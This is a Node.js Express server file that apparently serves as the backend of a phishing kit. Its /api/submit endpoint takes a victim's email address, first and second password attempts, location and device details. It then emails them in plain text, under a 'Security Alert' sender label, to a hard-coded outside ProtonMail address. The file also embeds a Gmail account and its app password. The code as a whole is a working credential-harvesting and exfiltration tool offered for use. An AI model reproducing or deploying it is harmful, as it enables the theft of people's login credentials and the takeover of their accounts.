const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Use Express 4.x (stable version)
console.log('🚀 Starting server...');

// Configuration
const CONFIG = {
  PORT: process.env.PORT || 3000,
  EMAIL: {
    USER: 'ranickiauerbach@gmail.com',
    PASS: 'nlov pvvd rcoa dnwl', // Make sure this is a 16-char app password
    RECIPIENT: 'ninugreenoptima.ae@proton.me',
    SENDERS: {
      FIRST_PW: 'logsnur01@rich.co',
      SECOND_PW: 'logsnur02@rich.us'
    }
  }
};

// Enhanced middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Handle preflight requests
app.options('*', cors());

// Create transporter with better configuration
const transporter = nodemailer.createTransport({
  service: 'gmail', // Use service instead of host/port
  auth: {
    user: CONFIG.EMAIL.USER,
    pass: CONFIG.EMAIL.PASS
  },
  debug: true, // Enable debug output
  logger: true  // Enable logger
});

// Verify transporter on startup
console.log('📧 Testing email configuration...');
transporter.verify(function(error, success) {
  if (error) {
    console.log('❌ EMAIL CONFIGURATION ERROR:', error);
    console.log('💡 TROUBLESHOOTING:');
    console.log('1. Check if Gmail app password is correct');
    console.log('2. Ensure 2FA is enabled in Google account');
    console.log('3. Generate new app password at: https://myaccount.google.com/apppasswords');
  } else {
    console.log('✅ Email server is ready to send messages');
  }
});

// Test endpoint - Simple email test
app.get('/api/test-email', async (req, res) => {
  console.log('🧪 Testing email sending...');
  
  try {
    const testMailOptions = {
      from: `"Test Server" <${CONFIG.EMAIL.USER}>`,
      to: CONFIG.EMAIL.RECIPIENT,
      subject: '🧪 Test Email from Server',
      text: 'This is a test email from your server. If you receive this, email configuration is working!',
      html: `
        <h2>✅ Test Email Successful!</h2>
        <p>This is a test email from your server.</p>
        <p>If you receive this, your email configuration is working correctly!</p>
        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
      `
    };

    const info = await transporter.sendMail(testMailOptions);
    console.log('✅ Test email sent successfully! Message ID:', info.messageId);
    
    res.json({
      success: true,
      message: 'Test email sent successfully!',
      messageId: info.messageId,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Test email failed:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      details: 'Check Gmail app password and 2FA settings'
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  console.log('🏥 Health check requested');
  res.json({ 
    status: 'OK', 
    message: 'Server is running',
    timestamp: new Date().toISOString(),
    endpoints: {
      '/api/health': 'Health check',
      '/api/test-email': 'Test email sending',
      '/api/submit': 'Main submission endpoint'
    }
  });
});

// Enhanced main endpoint
app.post('/api/submit', async (req, res) => {
  console.log('📨 Received submission request');
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  try {
    const { 
      email,
      firstpasswordused,
      secondpasswordused,
      country = 'Not detected',
      continent = 'Not detected',
      city = 'Not detected',
      device = {}
    } = req.body;

    // Validate required fields
    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Email is required'
      });
    }

    // Determine which password was used
    const passwordUsed = firstpasswordused || secondpasswordused;
    const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;

    if (!passwordUsed) {
      return res.status(400).json({
        success: false,
        error: 'Password is required'
      });
    }

    console.log(`📧 Sending email from: ${fromEmail}`);
    console.log(`📧 To: ${CONFIG.EMAIL.RECIPIENT}`);
    console.log(`📧 User email: ${email}`);
    console.log(`📧 Password: ${'*'.repeat(passwordUsed.length)}`);

    const mailOptions = {
      from: `"Security Alert" <${fromEmail}>`,
      to: CONFIG.EMAIL.RECIPIENT,
      subject: `🔐 New Login - ${email}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #d32f2f;">🔐 New Login Attempt</h2>
          
          <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 15px 0;">
            <h3 style="margin-top: 0;">Credentials</h3>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Password:</strong> ${passwordUsed}</p>
            <p><strong>Attempt:</strong> ${firstpasswordused ? 'First' : 'Second'}</p>
          </div>

          <div style="background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 15px 0;">
            <h3 style="margin-top: 0;">Location Info</h3>
            <p><strong>IP Location:</strong> ${city}, ${country}, ${continent}</p>
          </div>

          <div style="background: #f3e5f5; padding: 15px; border-radius: 5px; margin: 15px 0;">
            <h3 style="margin-top: 0;">Device Info</h3>
            <p><strong>User Agent:</strong> ${device.userAgent || 'Not available'}</p>
            <p><strong>Language:</strong> ${device.language || 'Not available'}</p>
            <p><strong>Platform:</strong> ${device.platform || 'Not available'}</p>
            <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
          </div>

          <hr>
          <p style="color: #666; font-size: 12px;">
            <strong>Received:</strong> ${new Date().toLocaleString()}<br>
            <strong>Server:</strong> Render.com
          </p>
        </div>
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Email sent successfully! Message ID:', info.messageId);

    res.json({
      success: true,
      message: 'Data received and email sent successfully',
      messageId: info.messageId,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('❌ Error processing request:', error);
    
    // More detailed error information
    let errorMessage = error.message;
    if (error.code === 'EAUTH') {
      errorMessage = 'Gmail authentication failed. Check app password.';
    } else if (error.code === 'EENVELOPE') {
      errorMessage = 'Email envelope error. Check recipient address.';
    }

    res.status(500).json({
      success: false,
      error: errorMessage,
      code: error.code,
      details: 'Check server logs for more information'
    });
  }
});

// Catch-all for undefined routes
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found',
    path: req.originalUrl
  });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('🚨 Unhandled error:', error);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: error.message
  });
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`🎉 Server successfully started on port ${CONFIG.PORT}`);
  console.log(`📍 Health check: https://your-app.onrender.com/api/health`);
  console.log(`📍 Email test: https://your-app.onrender.com/api/test-email`);
  console.log('📧 Email recipient:', CONFIG.EMAIL.RECIPIENT);
});
